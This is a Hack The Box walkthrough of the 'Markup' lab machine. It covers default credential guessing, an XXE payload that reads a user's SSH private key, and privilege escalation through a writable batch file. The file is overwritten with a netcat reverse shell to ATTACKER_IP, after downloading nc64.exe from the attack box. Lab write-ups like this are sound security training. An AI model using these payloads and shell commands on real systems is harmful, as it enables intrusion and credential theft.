
# HTB Walkthrough: Markup

This walkthrough covers the steps taken to complete the HTB machine **Markup**, including identifying vulnerabilities and leveraging them to gain initial and root access.

---

## Task 1: What version of Apache is running on the target’s port 80?

The first step was to perform an Nmap scan to enumerate open ports and services:
```bash
nmap -sC -sV TARGET_IP
```

This revealed three open ports: **22 (SSH)**, **80 (HTTP)**, and **443 (HTTPS)**.  

Examining port 80, I identified the version of Apache running on the target web server.

---

## Task 2: What username:password combination logs in successfully?

After identifying the web server on port 80, I began testing common username and password combinations. For example:

- `admin:12345`  
- `administrator:password`  
- `admin:password`  

The last combination, `admin:password`, was successful and granted access to the application.

---

## Task 3: What is the word at the top of the page that accepts user input?

Navigating through the website, I found a form on the **Order** page. This form accepts user input, which is essential for interacting with the target system.

---

## Task 4: What XML version is used on the target?

To determine the XML version, I used **BurpSuite** with the **FoxyProxy** plugin to intercept requests on port 8080. I submitted random data in the order form and inspected the request payload. This revealed the XML version used by the target.

---

## Task 5: What does the XXE/XEE attack acronym stand for?

XXE stands for **XML External Entity**. This information was quickly verified with a simple Google search.

---

## Task 6: What username can we find on the webpage’s HTML code?

Inspecting the webpage's source code in Mozilla Firefox repeatedly loaded `index.php`. Switching to Chromium allowed me to view the source code correctly, where I found the username: `daniel`.

---

## Task 7: What is the file located in the Log-Management folder on the target?

With the username `daniel` and the knowledge that SSH (port 22) was open, I deduced that each user would likely have a private key for authentication. Using an **XXE Injection**, I retrieved the private key.

In **BurpSuite**, I sent the intercepted request to the Repeater module and modified the XML payload as follows:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>
]>
<order>
  <quantity>3</quantity>
  <item>&test;</item>
  <address>17th Estate, CA</address>
</order>
```

This injection retrieved Daniel's private key. After saving it locally, I adjusted its permissions to make it readable for SSH:
```bash
chmod 600 id_rsa
```

Then, I connected to the target using the private key:
```bash
ssh -i id_rsa daniel@TARGET_IP
```

Once inside, I navigated to the **Log-Management** folder to locate the required file.

---

## Task 8: What executable is mentioned in the file mentioned before?

Using the `type` command, I inspected the file in the Log-Management folder and discovered references to an executable named `wevtutil`.

The purpose of `wevtutil` is to manage Windows event logs, such as querying, exporting, or clearing them. In this case, it was used alongside parameters `el` and `cl` in a batch script named **job.bat**.

---

## User Flag

The user flag was located in:
`C:/Users/daniel/Desktop/user.txt`

---

## Root Flag

Returning to the **Log-Management** folder, I examined **job.bat**, which was configured to clear log files. While it required Administrator privileges to execute, the file permissions revealed a vulnerability: the `BUILTIN\Users` group (which includes `daniel`) had full control over the file.

I modified **job.bat** to execute a reverse shell using Netcat:
1. Downloaded **nc64.exe** to the target system. Since the machine had no direct internet access, I hosted a simple HTTP server on the attack box:
   ```bash
   python3 -m http.server
   ```
   On the target system, I downloaded the file:
   ```powershell
   Invoke-WebRequest -Uri http://ATTACKER_IP:8000/nc64.exe -OutFile C:\Log-Management\nc64.exe
   ```

2. Edited **job.bat** to include the Netcat reverse shell command:
   ```bash
   echo C:\Log-Management\nc64.exe -e cmd.exe ATTACKER_IP PORT > C:\Log-Management\job.bat
   ```

3. Started a listener on the attack box:
   ```bash
   nc -lvnp PORT
   ```

When the script executed, I received a shell as the Administrator. The root flag was located in:
`C:/Users/administrator/Desktop/root.txt`

---

## Conclusion

The **Markup** machine highlights common misconfigurations and vulnerabilities, including weak credentials, XXE injection, and improper file permissions. These provided a clear path to escalate privileges and gain full control of the target.
